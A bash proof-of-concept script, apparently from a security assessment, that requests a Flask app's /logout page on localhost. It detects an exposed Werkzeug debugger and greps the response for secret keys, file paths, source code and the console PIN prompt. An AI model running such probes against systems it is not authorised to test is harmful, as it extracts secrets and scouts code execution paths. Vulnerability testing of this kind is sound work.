#!/bin/bash

# POC: Flask Debug Mode Information Disclosure
# Demonstrates access to Werkzeug debugger page with sensitive information
# Target: http://localhost:5003/logout

TARGET_URL="http://localhost:5003/logout"
OUTPUT_FILE="/tmp/debug_response.html"

echo "[*] Flask Debug Mode Information Disclosure POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Make request to /logout endpoint which triggers the debugger
echo "[*] Sending request to trigger debug page..."
curl -s -v "$TARGET_URL" 2>&1 | tee "$OUTPUT_FILE" > /dev/null

# Extract and display key indicators of the vulnerability
echo ""
echo "[+] Analyzing response for debug information..."
echo ""

# Check for Werkzeug debugger indicators
if grep -q "Werkzeug Debugger" "$OUTPUT_FILE"; then
    echo "[VULNERABLE] Werkzeug Debugger page detected"
fi

if grep -q "EVALEX = true" "$OUTPUT_FILE"; then
    echo "[CRITICAL] EVALEX enabled - arbitrary code execution possible"
fi

# Extract SECRET keys from JavaScript
echo ""
echo "[*] Extracting exposed SECRET keys..."
grep -o "SECRET = \"[^\"]*\"" "$OUTPUT_FILE" | head -5 || echo "[*] No secrets found in first check"

# Check for file paths disclosure
echo ""
echo "[*] Checking for sensitive file path disclosure..."
grep -o "/home/[^\"'<>]*" "$OUTPUT_FILE" | head -5 || echo "[*] No home directory paths found"

# Check for source code disclosure
echo ""
echo "[*] Checking for source code in error page..."
if grep -q "def logout" "$OUTPUT_FILE"; then
    echo "[VULNERABLE] Application source code visible in debugger page"
    echo "[*] Found logout function definition"
fi

# Check for error type
echo ""
echo "[*] Error Type:"
grep -o "TypeError: [^<]*" "$OUTPUT_FILE" || echo "[*] Error type not found"

# Check for pin prompt
echo ""
echo "[*] Checking for PIN-protected console..."
if grep -q "needs to be unlocked by entering the PIN" "$OUTPUT_FILE"; then
    echo "[VULNERABLE] PIN-protected debugger console detected (needs PIN to execute code)"
fi

# Summary
echo ""
echo "[+] Vulnerability Summary:"
echo "    - Debug mode: ENABLED"
echo "    - Sensitive information disclosure: YES"
echo "    - Source code visible: YES"
echo "    - RCE possibility: YES (with PIN)"
echo "    - File stored: $OUTPUT_FILE"
echo ""
echo "[!] CRITICAL: Flask running in debug mode in production!"